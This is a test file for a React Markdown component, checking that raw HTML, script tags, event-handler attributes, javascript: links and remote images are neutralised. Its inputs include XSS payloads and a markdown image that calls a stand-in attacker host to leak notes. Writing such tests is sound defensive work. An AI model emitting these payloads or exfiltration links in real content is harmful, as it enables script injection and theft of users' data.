import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import Markdown from "./Markdown";

describe("Markdown", () => {
  it("renders a table", () => {
    const text = "## Seeing it work\n\n| Step | Flags |\n|---|---|\n| 1 | SYN |\n| 2 | SYN, ACK |";
    render(<Markdown text={text} />);
    expect(screen.getByRole("heading", { name: "Seeing it work", level: 2 })).toBeInTheDocument();
    const table = screen.getByRole("table");
    expect(screen.getAllByRole("columnheader").map((c) => c.textContent)).toEqual(["Step", "Flags"]);
    expect(table).toHaveTextContent("SYN, ACK");
  });

  it("shows <script> and raw HTML as text and drops javascript: links", () => {
    const text = [
      "Tags look like `<script>alert(1)</script>` in code.",
      "",
      '<script>alert("x")</script>',
      "",
      "The <title> element names the page.",
      "",
      'Some <b onclick="alert(2)">bold</b> words and <img src=x onerror="alert(3)">.',
      "",
      "[click me](javascript:alert(4)) and [a page](https://example.com/a) and [home](/study)",
    ].join("\n");
    const { container } = render(<Markdown text={text} />);
    // Raw HTML is shown as its text, never as an element; in code it is text too.
    expect(screen.getByText("<script>alert(1)</script>")).toBeInTheDocument();
    expect(container).toHaveTextContent('<script>alert("x")</script>');
    expect(container).toHaveTextContent("The <title> element names the page.");
    expect(container).toHaveTextContent('Some <b onclick="alert(2)">bold</b> words');
    expect(container.querySelector("script, title, b, img, [onclick], [onerror]")).toBeNull();
    // Only the http(s) link is a link; the others keep their words.
    expect(screen.getAllByRole("link")).toHaveLength(1);
    expect(screen.getByRole("link", { name: "a page" })).toHaveAttribute("href", "https://example.com/a");
    expect(screen.getByRole("link", { name: "a page" })).toHaveAttribute("rel", "noopener noreferrer");
    expect(screen.getByText("click me")).not.toHaveAttribute("href");
    expect(screen.getByText("home")).not.toHaveAttribute("href");
  });

  it("never loads an image: only its alt text shows", () => {
    const { container } = render(<Markdown text={"See ![the notes, leaked](https://attacker.example/x?q=notes) here."} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container).toHaveTextContent("See the notes, leaked here.");
    expect(container.innerHTML).not.toContain("attacker.example");
  });
});
